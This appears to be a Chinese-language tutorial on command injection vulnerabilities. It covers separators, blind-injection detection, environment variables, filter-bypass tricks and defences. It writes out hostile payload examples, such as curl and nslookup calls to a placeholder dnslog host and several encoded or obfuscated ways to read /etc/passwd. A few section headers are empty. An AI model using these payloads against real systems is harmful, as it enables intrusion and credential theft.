命令注入漏洞

命令注入漏洞

一、定义

应用程序在调用系统命令时，未对用户输入进行严格验证，导致攻击者可以通过操纵输入参数来执行任意系统命令。

该漏洞主要出现在需要与操作系统交互的应用程序中，如文件处理、网络操作、系统管理等功能模块。

二、产生原因

应用程序将用户输入直接拼接到系统命令中，而没有进行必要的验证或转义，使得攻击者可以通过注入命令分隔符、重定向、管道等特殊字符，修改原始命令，执行额外的恶意命令。

三、命令注入的分类

分类 说明
直接命令注入 用户输入直接拼接到系统命令中执行
间接命令注入 用户通过环境变量、配置文件等间接影响系统命令执行
盲命令注入 命令执行结果不直接返回给用户，需通过侧信道判断
参数注入 注入命令参数而不是整个命令

盲命令注入的常见判断方式

方式 说明
时间延迟 ; sleep 5，通过响应时间判断
DNS 请求 ; nslookup xxx.dnslog.cn，通过 DNS 日志判断
HTTP 请求 ; curl http://xxx.dnslog.cn，通过 HTTP 日志判断
文件写入 ; echo test > /tmp/test，通过后续访问判断
报错回显 ; ls /nonexistent，通过错误信息判断

四、常用命令分隔符

分隔符 作用 适用系统 示例
; 命令序列分隔符，顺序执行多条指令 所有类 Unix 系统、Windows ls; whoami
& 后台执行命令，不等待前一命令完成 所有类 Unix 系统、Windows ping 127.0.0.1 & whoami
&& 仅当前命令成功执行时执行下一条指令 所有类 Unix 系统、Windows ls /tmp && whoami
| 管道符，将前一命令的输出作为后一命令的输入 所有类 Unix 系统、Windows cat /etc/passwd | grep root
|| 仅当前一命令失败执行时执行下一命令 所有类 Unix 系统、Windows ls /nonexistent || whoami
$() 命令替换，执行括号内的命令并替换为执行结果 所有类 Unix 系统 echo $(whoami)
` ` 命令替换（反引号），执行反引号内的命令并替换为执行结果 所有类 Unix 系统 echo `whoami`
> 输出重定向，将命令输出写入文件 所有类 Unix 系统、Windows whoami > user.txt
>> 追加输出重定向，将命令输出追加到文件 所有类 Unix 系统、Windows whoami >> user.txt
< 输入重定向，将文件内容作为命令输入 所有类 Unix 系统、Windows cat < input.txt
%0A URL 编码的换行符，在某些环境中可作为命令分隔符 所有类 Unix 系统、Windows ls%0Awhoami
%0D URL 编码的回车符 所有类 Unix 系统、Windows ls%0Dwhoami

Windows 特有分隔符

分隔符 作用 示例
| 管道符 dir | findstr "flag"
& 顺序执行 dir & whoami
&& 成功后执行 dir && whoami
|| 失败后执行 dir || whoami

五、环境变量与命令执行

环境变量可以被用于命令注入攻击，攻击者可以通过修改或设置特定的环境变量来影响命令执行：

  1. PATH 环境变量：攻击者可以修改 PATH 环境变量，使系统优先执行恶意程序
  2. LD_PRELOAD 环境变量：在 Linux 系统中，攻击者可以设置此变量加载恶意共享库
  3. 其他环境变量：特定程序可能依赖某些环境变量，攻击者可以利用这些变量进行攻击

常见可利用的环境变量

变量 说明
$PATH 命令搜索路径，可劫持命令执行
$HOME 用户主目录
$USER 当前用户名
$SHELL 当前 Shell
$IFS 内部字段分隔符，默认包含空格、制表符、换行符
$LD_PRELOAD 预加载共享库（Linux）
$BASH_ENV Bash 启动时执行的文件

六、绕过过滤

当应用程序对用户输入进行了某些过滤时，攻击者可以使用以下技术绕过过滤。

1. 常见绕过技巧

技术 说明 示例
大小写混合 绕过区分大小写的过滤 WhOaMi 代替 whoami
编码绕过 使用 URL 编码、双重 URL 编码等 %63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64 代替 cat /etc/passwd
空字节绕过 使用 null 字节（%00）截断字符串 cat /etc/passwd%00.jpg
特殊字符替换 使用功能相似的命令或参数替换被过滤的字符 $@ 代替空格，cat</etc/passwd 代替 cat /etc/passwd
命令分隔符替换 使用多种命令分隔符绕过过滤 使用 & 代替 ;

2. 空格过滤绕过

绕过方式 示例

<> cat<>/etc/passwd
%09（Tab） cat%09/etc/passwd
%0a（换行） cat%0a/etc/passwd
大括号 {cat,/etc/passwd}
变量拼接 a=/etc/passwd;cat$a

3. 关键字过滤绕过

绕过方式 示例
反斜杠转义 c\at /etc/passwd

绕过方式 示例

七、关于 IFS 的说明

IFS 为什么能绕过？

IFS 是 shell 的环境变量，默认包含空格、制表符和换行符。shell 在解析命令行时，会使用 IFS 来分割单词。

而 $IFS 在变量展开时会被替换成它的实际值，即一个空格（或其他空白字符）。

九、命令注入防御

  1. 避免直接调用系统命令：尽量使用语言内置的函数库
  2. 参数化调用：使用 escapeshellarg()、escapeshellcmd() 对参数转义
  3. 白名单验证：只允许特定字符，如 IP 地址只允许数字和点
  4. 输入过滤：过滤命令分隔符、特殊字符
  5. 最小权限：Web 应用以低权限用户运行
  6. 禁用危险函数：在 php.ini 中禁用 system、exec、shell_exec、passthru、popen、proc_open 等
  7. WAF：部署 Web 应用防火墙拦截命令注入攻击
  8. 日志监控：记录并监控命令执行日志

十、总结

维度 要点
本质 用户输入被拼接到系统命令中执行
核心条件 应用程序调用系统命令，且未对用户输入做严格过滤
常见分隔符 ;、&、&&、|、||、$()、反引号、%0a
常见绕过 大小写、编码、${IFS}、通配符、变量拼接、引号
常见目标 反弹 Shell、写入 WebShell、外带数据
防御核心 避免调用系统命令 + 参数化 + 白名单 + 最小权限
